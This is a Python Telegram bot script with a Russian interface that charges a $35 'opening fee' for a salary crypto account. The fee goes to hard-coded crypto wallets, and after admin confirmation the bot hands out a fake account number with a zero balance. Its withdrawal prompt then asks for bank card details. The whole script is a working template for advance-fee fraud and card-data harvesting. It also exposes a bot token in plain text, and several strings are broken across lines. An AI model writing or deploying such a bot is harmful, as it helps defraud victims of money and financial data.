import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from random import randint

TOKEN = "8122510813:AAHOpgwNJqUWUhuo01Wl0FywRS40sBARhR0"
ADMIN_ID = 7786764846
OPENING_FEE = 35

wallets = {
    "TRC20": "TQw19dGhSNeryY3eDX3byeD4KsThyNdCLU",
    "BEP20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "ERC20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "BTC": "1G7pG7WQwTvmmND9RgQFzkEQyuq9WAWeM3",
    "SOL": "3uUsgFUUUJLx5rYJ786rgcBozaxtFLvoSv1a2xvfbKrh"
}

bot = Bot(token=TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()
users = {}

def generate_account_id():
    return f"BW-{randint(1000000000000000, 9999999999999999)}"

@dp.message()
async def start(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧾 Открыть счёт за $35", callback_data="open")]
    ])
    await message.answer("Добро пожаловать! Чтобы открыть зарплатный криптосчёт, нажмите кнопку ниже:", reply_markup=kb)

@dp.callback_query(lambda c: c.data == "open")
async def choose_network(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=net, callback_data=f"pay:{net}")] for net in wallets
    ])
    await callback.message.edit_text("Выберите сеть для оплаты:", reply_markup=kb)

@dp.callback_query(lambda c: c.data.startswith("pay:"))
async def show_wallet(callback: types.CallbackQuery):
    net = callback.data.split(":")[1]
    wallet = wallets[net]
    users[callback.from_user.id] = {"status": "awaiting_payment", "network": net}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid")]
    ])
    await callback.message.edit_text(
f"💳 Отправьте <b>{OPENING_FEE}</b> на адрес в сети <b>{net}</b>:"
<code>{wallet}</code>

После отправки нажмите кнопку ниже.",
        reply_markup=kb
    )

@dp.callback_query(lambda c: c.data == "paid")
async def notify_admin(callback: types.CallbackQuery):
    u = callback.from_user
    net = users.get(u.id, {}).get("network", "N/A")
    text = (
        f"💸 Запрос на открытие счёта
"
        f"👤 @{u.username or u.id}
"
        f"🌐 Сеть: {net}
"
        f"Нажмите для подтверждения:"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"confirm:{u.id}")]
    ])
    await bot.send_message(ADMIN_ID, text, reply_markup=kb)
    await callback.message.edit_text("Ожидаем подтверждение администратора...")

@dp.callback_query(lambda c: c.data.startswith("confirm:"))
async def confirm_account(callback: types.CallbackQuery):
    uid = int(callback.data.split(":")[1])
    acc_id = generate_account_id()
    users[uid] = {"account_id": acc_id, "balance": 0}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Вывести средства", callback_data="withdraw")]
    ])
    await bot.send_message(uid, f"✅ Ваш криптосчёт открыт!
Номер: <code>{acc_id}</code>
Баланс: $0.00", reply_markup=kb)
    await callback.message.edit_text("Счёт подтверждён.")

@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    await callback.message.answer("💸 Введите сумму и способ вывода (карта РФ, СБП или крипта).
Пример:
<code>100 USDT на карту 5469 **** **** 1234</code>")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
